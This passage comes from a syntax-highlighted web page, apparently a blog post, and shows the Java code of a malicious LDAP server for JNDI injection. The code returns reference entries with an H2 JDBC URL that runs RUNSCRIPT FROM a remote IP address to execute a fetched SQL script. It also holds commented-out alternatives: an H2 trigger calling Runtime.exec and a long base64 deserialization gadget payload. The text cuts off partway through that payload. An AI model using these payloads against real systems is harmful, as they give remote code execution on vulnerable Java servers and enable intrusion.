InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            <span class="type">URL</span> <span class="variable">turl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="built_in">this</span>.codebase, <span class="built_in">this</span>.codebase.getRef().replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;.class&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="string">&quot; redirecting to &quot;</span> + turl);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;javax.sql.DataSource&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">cbstring</span> <span class="operator">=</span> <span class="built_in">this</span>.codebase.toString();</span><br><span class="line">            <span class="type">int</span> <span class="variable">refPos</span> <span class="operator">=</span> cbstring.indexOf(<span class="string">&#x27;#&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">            &#125;</span><br><span class="line"><span class="comment">//            Reference ref = new Reference(&quot;javax.sql.DataSource&quot;,&quot;com.zaxxer.hikari.HikariJNDIFactory&quot;,null);</span></span><br><span class="line"><span class="comment">//            String url = &quot;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#x27;http://8.130.24.188:7791/poc.sql&#x27;&quot;;</span></span><br><span class="line"><span class="comment">//            ref.add(new StringRefAddr(&quot;driverClassName&quot;,&quot;org.h2.Driver&quot;));</span></span><br><span class="line"><span class="comment">//            ref.add(new StringRefAddr(&quot;jdbcUrl&quot;,url));</span></span><br><span class="line"><span class="comment">//            ref.add(new StringRefAddr(&quot;username&quot;,&quot;root&quot;));</span></span><br><span class="line"><span class="comment">//            ref.add(new StringRefAddr(&quot;password&quot;,&quot;password&quot;));</span></span><br><span class="line"><span class="comment">//            ref.add(new StringRefAddr(&quot;initialSize&quot;,&quot;1&quot;));</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//            e.addAttribute(&quot;javaSerializedData&quot;, Base64.getDecoder().decode( SerializeUtils.base64serial(ref)));</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">/** Payload1: Return Reference Factory **/</span></span><br><span class="line">             e.addAttribute(<span class="string">&quot;javaCodeBase&quot;</span>, cbstring);</span><br><span class="line">             e.addAttribute(<span class="string">&quot;javaReferenceAddress&quot;</span>, <span class="string">&quot;@0@url@jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#x27;http://8.130.24.188:7791/poc.sql&#x27;&quot;</span>);</span><br><span class="line"><span class="comment">//             e.addAttribute(&quot;javaReferenceAddress&quot;, &quot;@0@url@jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\nINFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec(&#x27;open /&#x27;)\n$$\n&quot;);</span></span><br><span class="line">             e.addAttribute(<span class="string">&quot;objectClass&quot;</span>, <span class="string">&quot;javaNamingReference&quot;</span>);</span><br><span class="line">             e.addAttribute(<span class="string">&quot;javaFactory&quot;</span>, <span class="built_in">this</span>.codebase.getRef());</span><br><span class="line">            <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#x27;http://8.130.24.188:7791/poc.sql&#x27;&quot;</span>;</span><br><span class="line">            e.addAttribute(<span class="string">&quot;driverClassName&quot;</span>,<span class="string">&quot;org.h2.Driver&quot;</span>);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;jdbcUrl&quot;</span>,url);</span><br><span class="line">            <span class="comment">/** Payload1 end **/</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">/** Payload2: Return Serialized Gadget **/</span></span><br><span class="line"><span class="comment">//            try &#123;</span></span><br><span class="line"><span class="comment">//                // java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections6 &#x27;/Applications/Calculator.app/Contents/MacOS/Calculator&#x27;|base64</span></span><br><span class="line"><span class="comment">//                e.addAttribute(&quot;javaSerializedData&quot;,Base64.decode(&quot;rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAAAIAAAACc3IAI29yZy5oaWJlcm5hdGUuZW5naW5lLnNwaS5UeXBlZFZhbHVlh4gUshmh5zwCAAJMAAR0eXBldAAZTG9yZy9oaWJlcm5hdGUvdHlwZS9UeXBlO0wABXZhbHVldAASTGphdmEvbGFuZy9PYmplY3Q7eHBzcgAgb3JnLmhpYmVybmF0ZS50eXBlLkNvbXBvbmVudFR5cGXHO08ZYmxfcgIADVoAHGNyZWF0ZUVtcHR5Q29tcG9zaXRlc0VuYWJsZWRaABJoYXNOb3ROdWxsUHJvcGVydHlaAAVpc0tleUkADHByb3BlcnR5U3BhbkwAD2NhbkRvRXh0cmFjdGlvbnQAE0xqYXZhL2xhbmcvQm9vbGVhbjtbAAdjYXNjYWRldAAoW0xvcmcvaGliZXJuYXRlL2VuZ2luZS9zcGkvQ2FzY2FkZVN0eWxlO0wAEWNvbXBvbmVudFR1cGxpemVydAAxTG9yZy9oaWJlcm5hdGUvdHVwbGUvY29tcG9uZW50L0NvbXBvbmVudFR1cGxpemVyO0wACmVudGl0eU1vZGV0ABpMb3JnL2hpYmVybmF0ZS9FbnRpdHlNb2RlO1sAC2pvaW5lZEZldGNodAAaW0xvcmcvaGliZXJuYXRlL0ZldGNoTW9kZTtbAA1wcm9wZXJ0eU5hbWVzdAATW0xqYXZhL2xhbmcvU3RyaW5nO1sAE3Byb3BlcnR5TnVsbGFiaWxpdHl0AAJbWlsADXByb3BlcnR5VHlwZXN0ABpbTG9yZy9oaWJlcm5hdGUvdHlwZS9UeXBlO1sAIXByb3BlcnR5VmFsdWVHZW5lcmF0aW9uU3RyYXRlZ2llc3QAJltMb3JnL2hpYmVybmF0ZS90dXBsZS9WYWx1ZUdlbmVyYXRpb247eHIAH29yZy5oaWJlcm5hdGUudHlwZS5BYnN0cmFjdFR5cGXJFpSxstQ41AIAAHhwAAAAAAAAAXBwc3IAM29yZy5oaWJlcm5hdGUudHVwbGUuY29tcG9uZW50LlBvam9Db21wb25lbnRUdXBsaXplcsBwOcjTg59YAgAETAAOY29tcG9uZW50Q2xhc3N0ABFMamF2YS9sYW5nL0NsYXNzO0wACW9wdGltaXplcnQAMExvcmcvaGliZXJuYXRlL2J5dGVjb2RlL3NwaS9SZWZsZWN0aW9uT3B0aW1pemVyO0wADHBhcmVudEdldHRlcnQAKkxvcmcvaGliZXJuYXRlL3Byb3BlcnR5L2FjY2Vzcy9zcGkvR2V0dGVyO0wADHBhcmVudFNldHRlcnQAKkxvcmcvaGliZXJuYXRlL3Byb3BlcnR5L2FjY2Vzcy9zcGkvU2V0dGVyO3hyADdvcmcuaGliZXJuYXRlLnR1cGxlLmNvbXBvbmVudC5BYnN0cmFjdENvbXBvbmVudFR1cGxpemVy8vZxKVYnaN0CAAVaABJoYXNDdXN0b21BY2Nlc3NvcnNJAAxwcm9wZXJ0eVNwYW5bAAdnZXR0ZXJzdAArW0xvcmcvaGliZXJuYXRlL3Byb3BlcnR5L2FjY2Vzcy9zcGkvR2V0dGVyO0wADGluc3RhbnRpYXRvcnQAIkxvcmcvaGliZXJuYXRlL3R1cGxlL0luc3RhbnRpYXRvcjtbAAdzZXR0ZXJzdAArW0xvcmcvaGliZXJuYXRlL3Byb3BlcnR5L2FjY2Vzcy9zcGkvU2V0dGVyO3hwAAAAAAB1cgArW0xvcmcuaGliZXJuYXRlLnByb3BlcnR5LmFjY2Vzcy5zcGkuR2V0dGVyOyaF+ANJPbfPAgAAeHAAAAABc3IAPW9yZy5oaWJlcm5hdGUucHJvcGVydHkuYWNjZXNzLnNwaS5HZXR0ZXJNZXRob2RJbXBsJFNlcmlhbEZvcm2sW7ZWyd0bWAIABEwADmNvbnRhaW5lckNsYXNzcQB+ABNMAA5kZWNsYXJpbmdDbGFzc3EAfgATTAAKbWV0aG9kTmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO0wADHByb3BlcnR5TmFtZXEAfgAfeHB2cgAwamF2YXguc3dpbmcuSkZvcm1hdHRlZFRleHRGaWVsZCRGb2N1c0xvc3RIYW5kbGVyDZKYQeXd2OkCAAFMAAZ0aGlzJDB0ACFMamF2YXgvc3dpbmcvSkZvcm1hdHRlZFRleHRGaWVsZDt4cHEAfgAjdAADcnVudAAEdGVzdHBwcHBwcHBwcHB1cgAaW0xvcmcuaGliZXJuYXRlLnR5cGUuVHlwZTt+r6uh5JVhmgIAAHhwAAAAAXEAfgARcHNxAH4AIXNyAB9qYXZheC5zd2luZy5KRm9ybWF0dGVkVGV4dEZpZWxkEwcjMaVrPZsDAAtaABJjb21wb3NlZFRleHRFeGlzdHNaAAllZGl0VmFsaWRaAAZlZGl0ZWRJABFmb2N1c0xvc3RCZWhhdmlvckwAEGRvY3VtZW50TGlzdGVuZXJ0ACRMamF2YXgvc3dpbmcvZXZlbnQvRG9jdW1lbnRMaXN0ZW5lcjtMAAdmYWN0b3J5dAA6TGphdmF4L3N3aW5nL0pGb3JtYXR0ZWRUZXh0RmllbGQkQWJzdHJhY3RGb3JtYXR0ZXJGYWN0b3J5O0wAEGZvY3VzTG9zdEhhbmRsZXJ0ADJMamF2YXgvc3dpbmcvSkZvcm1hdHRlZFRleHRGaWVsZCRGb2N1c0xvc3RIYW5kbGVyO0wABmZvcm1hdHQAM0xqYXZheC9zd2luZy9KRm9ybWF0dGVkVGV4dEZpZWxkJEFic3RyYWN0Rm9ybWF0dGVyO0wABG1hc2txAH4ABEwAFnRleHRGb3JtYXR0ZXJBY3Rpb25NYXB0ABdMamF2YXgvc3dpbmcvQWN0aW9uTWFwO0wABXZhbHVlcQB+AAR4cgAWamF2YXguc3dpbmcuSlRleHRGaWVsZNU5p/18PJiBAwAHSQALY29sdW1uV2lkdGhJAAdjb2x1bW5zSQATaG9yaXpvbnRhbEFsaWdubWVudEwABmFjdGlvbnQAFExqYXZheC9zd2luZy9BY3Rpb247TAAcYWN0aW9uUHJvcGVydHlDaGFuZ2VMaXN0ZW5lcnQAI0xqYXZhL2JlYW5zL1Byb3BlcnR5Q2hhbmdlTGlzdGVuZXI7TAAHY29tbWFuZHEAfgAfTAAKdmlzaWJpbGl0eXQAH0xqYXZheC9zd2luZy9Cb3VuZGVkUmFuZ2VNb2RlbDt4cgAfamF2YXguc3dpbmcudGV4dC5KVGV4dENvbXBvbmVudFg4kzYsDF77AgAUWgAUY2hlY2tlZElucHV0T3ZlcnJpZGVaAAtkcmFnRW5hYmxlZFoACGVkaXRhYmxlQwAQZm9jdXNBY2NlbGVyYXRvcloAF25lZWRUb1NlbmRLZXlUeXBlZEV2ZW50TAAKY2FyZXRDb2xvcnQAEExqYXZhL2F3dC9Db2xvcjtMABVjb21wb3NlZFRleHRBdHRyaWJ1dGV0ACVMamF2YXgvc3dpbmcvdGV4dC9TaW1wbGVBdHRyaWJ1dGVTZXQ7TAARY29tcG9zZWRUZXh0Q2FyZXR0ADNMamF2YXgvc3dpbmcvdGV4dC9KVGV4dENvbXBvbmVudCRDb21wb3NlZFRleHRDYXJldDtMABNjb21wb3NlZFRleHRDb250ZW50cQB+AB9MAA9jb21wb3NlZFRleHRFbmR0ABtMamF2YXgvc3dpbmcvdGV4dC9Qb3NpdGlvbjtMABFjb21wb3NlZFRleHRTdGFydHEAfgA3TAARZGlzYWJsZWRUZXh0Q29sb3JxAH4ANEwACGRyb3BNb2RldAAWTGphdmF4L3N3aW5nL0Ryb3BNb2RlO0wAFmxhdGVzdENvbW1pdHRlZFRleHRFbmRxAH4AN0wAGGxhdGVzdENvbW1pdHRlZFRleHRTdGFydHEAfgA3TAAGbWFyZ2ludAARTGphdmEvYXd0L0luc2V0cztMAAVtb2RlbHQAG0xqYXZheC9zd2luZy90ZXh0L0RvY3VtZW50O0wAEG5hdmlnYXRpb25GaWx0ZXJ0ACNMamF2YXgvc3dpbmcvdGV4dC9OYXZpZ2F0aW9uRmlsdGVyO0wAEXNlbGVjdGVkVGV4dENvbG9ycQB+ADRMAA5zZWxlY3Rpb25Db2xvcnEAfgA0eHIAFmphdmF4LnN3aW5nLkpDb21wb25lbnQ/rbvCEftqkwMAEEYACmFsaWdubWVudFhGAAphbGlnbm1lbnRZWgALYXV0b3Njcm9sbHNJAAVmbGFnc1oAD2lzQWxpZ25tZW50WFNldFoAD2lzQWxpZ25tZW50WVNldFoAGnZlcmlmeUlucHV0V2hlbkZvY3VzVGFyZ2V0TAAJYWN0aW9uTWFwcQB+AC5MABBhbmNlc3RvcklucHV0TWFwdAAWTGphdmF4L3N3aW5nL0lucHV0TWFwO0wABmJvcmRlcnQAG0xqYXZheC9zd2luZy9ib3JkZXIvQm9yZGVyO0wADWZvY3VzSW5wdXRNYXBxAH4APUwADWlucHV0VmVyaWZpZXJ0ABtMamF2YXgvc3dpbmcvSW5wdXRWZXJpZmllcjtMAAxsaXN0ZW5lckxpc3R0ACVMamF2YXgvc3dpbmcvZXZlbnQvRXZlbnRMaXN0ZW5lckxpc3Q7TAAJcG9wdXBNZW51dAAYTGphdmF4L3N3aW5nL0pQb3B1cE1lbnU7TAAVdmV0b2FibGVDaGFuZ2VTdXBwb3J0dAAiTGphdmEvYmVhbnMvVmV0b2FibGVDaGFuZ2VTdXBwb3J0O0wADndpbmRvd0lucHV0TWFwdAAfTGphdmF4L3N3aW5nL0NvbXBvbmVudElucHV0TWFwO3hyABJqYXZhLmF3dC5Db250YWluZXJAB4Bz/RQMJwMACEkAHmNvbnRhaW5lclNlcmlhbGl6ZWREYXRhVmVyc2lvbloADmZvY3VzQ3ljbGVSb290WgAcZm9jdXNUcmF2ZXJzYWxQb2xpY3lQcm92aWRlckkAC25jb21wb25lbnRzWwAJY29tcG9uZW50dAAVW0xqYXZhL2F3dC9Db21wb25lbnQ7TAAKZGlzcGF0Y2hlcnQAIExqYXZhL2F3dC9MaWdodHdlaWdodERpc3BhdGNoZXI7TAAJbGF5b3V0TWdydAAYTGphdmEvYXd0L0xheW91dE1hbmFnZXI7TAAHbWF4U2l6ZXQAFExqYXZhL2F3dC9EaW1lbnNpb247eHIAEmphdmEuYXd0LkNvbXBvbmVudJXqplnXPKSaAwAkWgAbYXV0b0ZvY3VzVHJhbnNmZXJPbkRpc3Bvc2FsSQAIYm91bmRzT3BJAB5jb21wb25lbnRTZXJpYWxpemVkRGF0YVZlcnNpb25aAAdlbmFibGVkSgAJZXZlbnRNYXNrWgAZZm9jdXNUcmF2ZXJzYWxLZXlzRW5hYmxlZFoACWZvY3VzYWJsZUkABmhlaWdodFoADWlnbm9yZVJlcGFpbnRJABxpc0ZvY3VzVHJhdmVyc2FibGVPdmVycmlkZGVuWgAIaXNQYWNrZWRaAAptYXhTaXplU2V0WgAKbWluU2l6ZVNldFoAEW5hbWVFeHBsaWNpdGx5U2V0WgANbmV3RXZlbnRzT25seVoAC3ByZWZTaXplU2V0WgAFdmFsaWRaAAd2aXNpYmxlSQAFd2lkdGhJAAF4SQABeUwAEWFjY2Vzc2libGVDb250ZXh0dAAnTGphdmF4L2FjY2Vzc2liaWxpdHkvQWNjZXNzaWJsZUNvbnRleHQ7TAAKYmFja2dyb3VuZHEAfgA0TAANY2hhbmdlU3VwcG9ydHQAIkxqYXZhL2JlYW5zL1Byb3BlcnR5Q2hhbmdlU3VwcG9ydDtMAAZjdXJzb3J0ABFMamF2YS9hd3QvQ3Vyc29yO0wACmRyb3BUYXJnZXR0ABlMamF2YS9hd3QvZG5kL0Ryb3BUYXJnZXQ7WwASZm9jdXNUcmF2ZXJzYWxLZXlzdAAQW0xqYXZhL3V0aWwvU2V0O0wABGZvbnR0AA9MamF2YS9hd3QvRm9udDtMAApmb3JlZ3JvdW5kcQB+ADRMAAZsb2NhbGV0ABJMamF2YS91dGlsL0xvY2FsZTtMAAdtYXhTaXplcQB+AEhMAAdtaW5TaXplcQB+AEhMAARuYW1lcQB+AB9MAAhwZWVyRm9udHEAfgBPTAAGcG9wdXBzdAASTGphdmEvdXRpbC9WZWN0b3I7TAAIcHJlZlNpemVxAH4ASHhwAQAAAAMAAAAEAQAAAAAAABg8AQEAAAAAAAAAAAAAAAAAAQAAAQAAAAAAAAAAAAAAAHBzcgAgamF2YXguc3dpbmcucGxhZi5Db2xvclVJUmVzb3VyY2VrU/mf8urmkgIAAHhyAA5qYXZhLmF3dC5Db2xvcgGlF4MQjzN1AgAFRgAGZmFscGhhSQAFdmFsdWVMAAJjc3QAG0xqYXZhL2F3dC9jb2xvci9Db2xvclNwYWNlO1sACWZyZ2J2YWx1ZXQAAltGWwAGZnZhbHVlcQB+AFZ4cAAAAAD/////cHBwc3IAIGphdmEuYmVhbnMuUHJvcGVydHlDaGFuZ2VTdXBwb3J0WNXSZFdIYLsDAANJACpwcm9wZXJ0eUNoYW5nZVN1cHBvcnRTZXJpYWxpemVkRGF0YVZlcnNpb25MAAhjaGlsZHJlbnQAFUxqYXZhL3V0aWwvSGFzaHRhYmxlO0wABnNvdXJjZXEAfgAEeHAAAAACcHEAfgBScHhwcHBzcgAtY29tLmFwcGxlLmxhZi5BcXVhRm9udHMkRGVyaXZlZFVJUmVzb3VyY2VGb2507ovW3DiEFo0CAAB4cgAfamF2YXguc3dpbmcucGxhZi5Gb250VUlSZXNvdXJjZQFCxIfBIotHAgAAeHIADWphdmEuYXd0LkZvbnTFoTXmzN5WcwMABkkAGWZvbnRTZXJpYWxpemVkRGF0YVZlcnNpb25GAAlwb2ludFNpemVJAARzaXplSQAFc3R5bGVMABRmUmVxdWVzdGVkQXR0cmlidXRlc3EAfgBZTAAEbmFtZXEAfgAfeHAAAAABQVAAAAAAAA0AAAAAcHQADUx1Y2lkYSBHcmFuZGV4c3EAfgBTAAAAAP8AAABwcHBzcgAQamF2YS51dGlsLkxvY2FsZX74EWCcMPnsAwAGSQAIaGFzaGNvZGVMAAdjb3VudHJ5cQB+AB9MAApleHRlbnNpb25zcQB+AB9MAAhsYW5ndWFnZXEAfgAfTAAGc2NyaXB0cQB+AB9MAAd2YXJpYW50cQB+AB94cP////90AAJDTnQAAHQAAnpodAAESGFuc3EAfgBkeHBwcHBwcHQABmZvY3VzTHNyADFqYXZheC5zd2luZy50ZXh0LkpUZXh0Q29tcG9uZW50JE11dGFibGVDYXJldEV2ZW500R/T5kdZfP0CAANJAANkb3RaAApkcmFnQWN0aXZlSQAEbWFya3hyABxqYXZheC5zd2luZy5ldmVudC5DYXJldEV2ZW50yQnzW3JWr1ACAAB4cgAVamF2YS51dGlsLkV2ZW50T2JqZWN0TI0JThhtfagCAAB4cAAAAAAAAAAAAHQABm1vdXNlTHEAfgBrcHNyAB1qYXZhLmF3dC5Db21wb25lbnRPcmllbnRhdGlvbsbqp0WhnGPMAgABSQALb3JpZW50YXRpb254cAAAAAdwcHgAAAABAAAAAAAAdXIAFVtMamF2YS5hd3QuQ29tcG9uZW50OxUPiQ0W5qp1AgAAeHAAAAAAcHBwcHB4AAAAAAAAAAABAABBIAAAAXNyABVqYXZheC5zd2luZy5BY3Rpb25NYXCo4cX/epLQ1gMAAUwABnBhcmVudHEAfgAueHBwdwQAAAAAeHBwc3IAFGphdmF4LnN3aW5nLklucHV0TWFwtKgbHGYh2Z8DAAFMAAZwYXJlbnRxAH4APXhwc3IAI2phdmF4LnN3aW5nLnBsYWYuSW5wdXRNYXBVSVJlc291cmNls0iiTdeb8rYCAAB4cQB+AHNzcQB+AHVwdwQAAABMc3IAFWphdmF4LnN3aW5nLktleVN0cm9rZYJDxZd1dgk+AgAAeHIAFWphdmEuYXd0LkFXVEtleVN0cm9rZabCIjiqpXzxAgAEQwAHa2V5Q2hhckkAB2tleUNvZGVJAAltb2RpZmllcnNaAAxvbktleVJlbGVhc2V4cP//AAAAJgAAAEEAdAAUc2VsZWN0aW9uLWJlZ2luLWxpbmVzcQB+AHj//wAAAOIAAAFFAHEAfgB7c3EAfgB4//8AAABQAAAAggB0AAtjYXJldC1iZWdpbnNxAH4AeP//AAAA4AAAAUUAdAAPc2VsZWN0aW9uLWJlZ2luc3EAfgB4//8AAADgAAAAQQBxAH4Ae3NxAH4AeP//AAAAKAAAAAAAdAAJZGVjcmVtZW50c3EAfgB4//8AAABcAAABBAB0AAh1bnNlbGVjdHNxAH4AeP//AAAATgAAAIIAdAAJY2FyZXQtZW5kc3EAfgB4//8AAP/RAAAAAAB0ABBjdXQtdG8tY2xpcGJvYXJkc3EAfgB4//8AAAAjAAAAAABxAH4Ah3NxAH4AeP//AAAAIQAAAEEAdAARc2VsZWN0aW9uLXBhZ2UtdXBzcQB+AHj//wAAAOAAAAAAAHQACWluY3JlbWVudHNxAH4AeP//AAAAfwAAAAAAdAALZGVsZXRlLW5leHRzcQB+AHj//wAAAFYAAAEEAHQAFHBhc3RlLWZyb20tY2xpcGJvYXJkc3EAfgB4//8AAAAlAAAAQQB0ABJzZWxlY3Rpb24tYmFja3dhcmRzcQB+AHj//wAAAEMAAAEEAHQAEWNvcHktdG8tY2xpcGJvYXJkc3EAfgB4//8AAADjAAABBAB0AA5jYXJldC1lbmQtbGluZXNxAH4AeP//AAAAJgAAAQQAcQB+AH5zcQB+AHj//wAAAAgAAAAAAHQAD2RlbGV0ZS1wcmV2aW91c3NxAH4AeP//AAAA4AAAAQQAcQB+AH5zcQB+AHj//wAAACUAAAAAAHQADmNhcmV0LWJhY2t3YXJkc3EAfgB4//8AAAAlAAACSQB0ABdzZWxlY3Rpb24tcHJldmlvdXMtd29yZHNxAH4AeP//AAAA4gAAAAAAcQB+AJ5zcQB+AHj//wAAAOIAAAIIAHQAE2NhcmV0LXByZXZpb3VzLXdvcmRzcQB+AHj//wAAACgAAAFFAHQADXNlbGVjdGlvbi1lbmRzcQB+AHj//wAAACYAAAFFAHEAfgCAc3EAfgB4//8AAAAIAAACCAB0ABRkZWxldGUtcHJldmlvdXMtd29yZHNxAH4AeP//AAAAIgAAAUUAdAAUc2VsZWN0aW9uLXBhZ2UtcmlnaHRzcQB+AHj//wAAAOMAAABBAHQAEXNlbGVjdGlvbi1mb3J3YXJkc3EAfgB4//8AAADjAAACCAB0AA9jYXJldC1uZXh0LXdvcmRzcQB+AHj//wAAACUAAAIIAHEAfgCjc3EAfgB4//8AAABIAAAAggBxAH4Am3NxAH4AeP//AAAAGwAAAAAAdAAQcmVzZXQtZmllbGQtZWRpdHNxAH4AeP//AAAA4gAAAkkAcQB+AKBzcQB+AHj//wAAAAoAAAAAAHQAE25vdGlmeS1maWVsZC1hY2NlcHRzcQB+AHj//wAAACQAAABBAHEAfgCAc3EAfgB4//8AAAAnAAAAAAB0AA1jYXJldC1mb3J3YXJkc3EAfgB4//8AAAAnAAACCABxAH4ArnNxAH4AeP//AAAARgAAAIIAcQB+ALhzcQB+AHj//wAAAOMAAAFFAHQAEnNlbGVjdGlvbi1lbmQtbGluZXNxAH4AeP//AAAA4QAAAUUAcQB+AKVzcQB+AHj//wAAACgAAABBAHEAfgC8c3EAfgB4//8AAAAiAAAAAAB0AA5hcXVhLXBhZ2UtZG93bnNxAH4AeP//AAAARQAAAIIAcQB+AJhzcQB+AHj//wAAACcAAAEEAHEAfgCYc3EAfgB4//8AAABBAAABBAB0AApzZWxlY3QtYWxsc3EAfgB4//8AAADiAAAAQQBxAH4AlHNxAH4AeP//AAAA4QAAAQQAcQB+AIdzcQB+AHj//wAAAEQAAACCAHEAfgCQc3EAfgB4//8AAABPAAAAwwB0ABt0b2dnbGUtY29tcG9uZW50T3JpZW50YXRpb25zcQB+AHj//wAAAOMAAAJJAHQAE3NlbGVjdGlvbi1uZXh0LXdvcmRzcQB+AHj//wAAACMAAABBAHEAfgClc3EAfgB4//8AAABXAAAAggBxAH4AqHNxAH4AeP//AAAAfwAAAggAdAAQZGVsZXRlLW5leHQtd29yZHNxAH4AeP//AAAAQgAAAIIAcQB+AJ5zcQB+AHj//wAAACQAAAAAAHEAfgB+c3EAfgB4//8AAABWAAAAggBxAH4Ah3NxAH4AeP//AAAA4QAAAAAAcQB+AINzcQB+AHj//wAAAEEAAACCAHQAEGNhcmV0LWJlZ2luLWxpbmVzcQB+AHj//wAAACcAAABBAHEAfgCsc3EAfgB4//8AAAAnAAACSQBxAH4Ay3NxAH4AeP//AAD/zQAAAAAAcQB+AJZzcQB+AHj//wAAAFgAAAEEAHEAfgCJc3EAfgB4//8AAADhAAAAQQBxAH4AvHNxAH4AeP//AAAAJwAAAUUAcQB+ALxzcQB+AHj//wAAACUAAAFFAHEAfgB7c3EAfgB4//8AAAAhAAABRQB0ABNzZWxlY3Rpb24tcGFnZS1sZWZ0c3EAfgB4//8AAAAoAAABBABxAH4Ah3NxAH4AeP//AAAAJgAAAAAAcQB+AI5zcQB+AHj//wAAACIAAABBAHQAE3NlbGVjdGlvbi1wYWdlLWRvd25zcQB+AHj//wAAAAgAAABBAHEAfgCbc3EAfgB4//8AAADjAAAAAABxAH4AuHNxAH4AeP//AAAA4gAAAQQAcQB+ANVzcQB+AHj//wAAACUAAAEEAHEAfgDVc3EAfgB4//8AAAAhAAAAAAB0AAxhcXVhLXBhZ2UtdXBzcQB+AHj//wAA/88AAAAAAHEAfgCSeHcEAAAAAHh3BAAAAAB4cHNyACNqYXZheC5zd2luZy5ldmVudC5FdmVudExpc3RlbmVyTGlzdJFIzC1z3w7eAwAAeHBweHBwcHcEAAAAAHgAAAEAAABwcHBwcHBwfnIAFGphdmF4LnN3aW5nLkRyb3BNb2RlAAAAAAAAAAASAAB4cgAOamF2YS5sYW5nLkVudW0AAAAAAAAAABIAAHhwdAANVVNFX1NFTEVDVElPTnBwcHNyAB5qYXZheC5zd2luZy50ZXh0LlBsYWluRG9jdW1lbnRCCNfOucWF4AIAA0wABWFkZGVkcQB+AFFMAAtkZWZhdWx0Um9vdHQAM0xqYXZheC9zd2luZy90ZXh0L0Fic3RyYWN0RG9jdW1lbnQkQWJzdHJhY3RFbGVtZW50O0wAB3JlbW92ZWRxAH4AUXhyACFqYXZheC5zd2luZy50ZXh0LkFic3RyYWN0RG9jdW1lbnSxs0Ibkf3HGAIABUwAB2NvbnRleHR0ADRMamF2YXgvc3dpbmcvdGV4dC9BYnN0cmFjdERvY3VtZW50JEF0dHJpYnV0ZUNvbnRleHQ7TAAEZGF0YXQAK0xqYXZheC9zd2luZy90ZXh0L0Fic3RyYWN0RG9jdW1lbnQkQ29udGVudDtMAA5kb2N1bWVudEZpbHRlcnQAIUxqYXZheC9zd2luZy90ZXh0L0RvY3VtZW50RmlsdGVyO0wAEmRvY3VtZW50UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvRGljdGlvbmFyeTtMAAxsaXN0ZW5lckxpc3RxAH4AQHhwc3IAHWphdmF4LnN3aW5nLnRleHQuU3R5bGVDb250ZXh0b535fnu9ePEDAAJJAAp1bnVzZWRTZXRzTAAGc3R5bGVzdAAYTGphdmF4L3N3aW5nL3RleHQvU3R5bGU7eHAAAAAAc3IAKGphdmF4LnN3aW5nLnRleHQuU3R5bGVDb250ZXh0JE5hbWVkU3R5bGXnDE7G4IKspQMAAkwADGxpc3RlbmVyTGlzdHEAfgBATAAGdGhpcyQwdAAfTGphdmF4L3N3aW5nL3RleHQvU3R5bGVDb250ZXh0O3hwc3EAfgDqcHhxAH4A+ncEAAAAAXQAB2RlZmF1bHRzcQB+APtzcQB+AOpweHEAfgD6dwQAAAABdAAkamF2YXguc3dpbmcudGV4dC5TdHlsZUNvbnN0YW50cy5uYW1lcQB+AP94eHhzcgAeamF2YXguc3dpbmcudGV4dC5TdHJpbmdDb250ZW50QgCvvTb+BB0CAAJJAAVjb3VudFsABGRhdGF0AAJbQ3hwAAAAIXVyAAJbQ7AmZrDiXYSsAgAAeHAAAABAAGgAdAB0AHAAOgAvAC8AOAAuADEAMwAwAC4AMgA0AC4AMQA4ADgAOgA3ADcAOQAxAC8AZQB4AHAALgB4AG0AbAAKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABwc3IAE2phdmEudXRpbC5IYXNodGFibGUTuw8lIUrkuAMAAkYACmxvYWRGYWN0b3JJAAl0aHJlc2hvbGR4cD9AAAAAAAAIdwgAAAALAAAABHQADmZpbHRlck5ld2xpbmVzc3IAEWphdmEubGFuZy5Cb29sZWFuzSBygNWc+u4CAAFaAAV2YWx1ZXhwAXNyABtqYXZhLmF3dC5mb250LlRleHRBdHRyaWJ1dGVreJ2MDegNRgIAAHhyAC9qYXZhLnRleHQuQXR0cmlidXRlZENoYXJhY3Rlckl0ZXJhdG9yJEF0dHJpYnV0ZYEedCbNRxdcAgABTAAEbmFtZXEAfgAfeHB0AA1ydW5fZGlyZWN0aW9uc3EAfgELAHQABGkxOG5xAH4BEXQAB3RhYlNpemVzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAACHhzcQB+AOp0ACJqYXZheC5zd2luZy5ldmVudC5Eb2N1bWVudExpc3RlbmVyc3IAL2phdmF4LnN3aW5nLkpGb3JtYXR0ZWRUZXh0RmllbGQkRG9jdW1lbnRIYW5kb